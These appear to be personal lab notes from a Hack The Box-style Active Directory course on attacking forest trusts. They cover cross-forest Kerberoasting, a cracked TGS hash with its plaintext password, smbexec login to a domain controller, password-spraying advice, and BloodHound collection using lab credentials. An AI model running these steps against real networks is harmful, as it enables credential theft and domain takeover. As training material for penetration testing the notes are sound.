
## Cross-Forest Kerberoasting
Kerberoast across forest trust using GetUserSPNs.py. Need creds for user authenticating to target domain. Use `-target-domain` flag.

### Enumerate SPNs in Target Domain (GetUserSPNs.py)
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
- Prompt for password.
- Output example (Impacket v0.9.25.dev1+20220311.121550.1271d369):
```
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```
Shows one SPN (mssqlsvc, Domain Admin).

### Request TGS Ticket (-request Flag)
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```
- Prompt for password.
- Output includes enumeration + TGS hash:
```
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```
- Add `-outputfile <FILE>` to save hash directly.
- Crack offline: Hashcat mode 13100.
- Success = Domain Admin in target domain.
- Check: Does account exist in current domain? Test password reuse for quick escalation.
- If no escalation yet, spray cracked password on other service accounts (if same admins manage both domains). Iterative testing key.
### Request TGS Ticket for a specific user (-request-user Flag)
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley  
```
- Prompt for password.
### Crack TGS Hash with Hashcat
```bash
hashcat -m 13100 -w 3 -O TGS_mssqlsvc.txt /usr/share/wordlists
```
#### Output
```
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$834d667cc36963a2ef615a7c2cd82394$f08a033813584c1a8b202c3f336514969248f1598d0a7a6b4192b7a423636b18bba4a332961c7c78e574146e8510e98249b640bed123ac662c7c934fc6ac9b5f69a972101d5db851ec09345d766c85e5312a737229f3f69ec486a836492ed132d4fdbced19e2b04de6dd843c6c2152c6088a6179b8f2101392b814c39c74d09c85d4633ae06383650906c21a1ebbe800887238e4d26bb0e297087cc4d4f6755b06abcd4019b780ead98137df9d2094ea962c3f1faf5a1bfa1448a1eb3e1414f8b3d67a8e3a6b245654b9c719e949bad43d74c5022e0d7c91b74085c4f7f6a2f6f44c722bb2ec75936e98855e7836d5767b1a688faf5d011f4376ccffe4ef6f000c8c3d7f8a382a137585155b21e3d9540e2d068987c4a050c7fd6657f230a37a23030f1df449c7539e9499ae0353c81a497d6b3a80325d26c298e1ad6e00aac3e129577602187e95852495c7810b118f37bf89051ee8255b0f729c1400dbcd08a1f781d8384ebf48c6ace58a42a0450f68b937ccc3a89782a342925ab375270e62ecc13055277aae06bd42292f8124952eaafa94791833159cb0d4458dc6730aad02452bc7c4ad8572cb8d627e8ba27028911cfeb51be905e6d69a5e0f0274ae6b77073c987a87fddfb8fb3f14147d99f80b08d35d2a949f1e031a5e7c067d80ba3acf6b91739bb:pabloPICASSO

```
### Log into the Domain Controller 
need to use `smbexec` to log in to `ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL`, utilizing the credentials `sapsso:pabloPICASSO`:

```bash
smbexec.py freightlogistics/sapsso@freightlogistics.local
```

## Hunting Foreign Group Membership (bloodhound-python)
Collect data from multiple domains, ingest into BloodHound GUI to find cross-domain group memberships (e.g., Domain A admin in Domain B's Administrators). Only Domain Local Groups allow external principals.

### Setup DNS (/etc/resolv.conf)
For domains without configured DNS, edit resolv.conf (sudo):
- Comment out existing nameservers.
- Add domain and DC IP.

For INLANEFREIGHT.LOCAL:
```
z3tssu@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

For FREIGHTLOGISTICS.LOCAL:
```
z3tssu@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

### Run bloodhound-python (INLANEFREIGHT.LOCAL)
```
z3tssu@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
- Output example:
```
INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
<SNIP>
```
- Generates JSON files (computers, domains, groups, users).

### Compress JSON Files
```
z3tssu@htb[/htb]$ zip -r ilfreight_bh.zip *.json
```
- Output example:
```
  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)
```
- Upload zip or individual JSONs to BloodHound GUI.

### Run bloodhound-python (FREIGHTLOGISTICS.LOCAL)
```
z3tssu@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
- Output example:
```
INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```
- Generate/compress JSONs, upload to GUI.

### Analyze in BloodHound GUI
- Upload data from both domains.
- Analysis tab > "Users with Foreign Domain Group Membership".
- Source domain: INLANEFREIGHT.LOCAL.
- Shows: ADMINISTRATOR@INLANEFREIGHT.LOCAL member of ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL.
- Diagram: Links admin users/groups across domains.

## Closing Thoughts on Trusts
Leverage trusts for access/escalation: Kerberoast cross-trust, password reuse, ExtraSids (child->parent). Enumerate trusts, intra/cross-forest attacks. Large topic; iterative testing essential (no stone unturned). Report findings like reuse even post-compromise.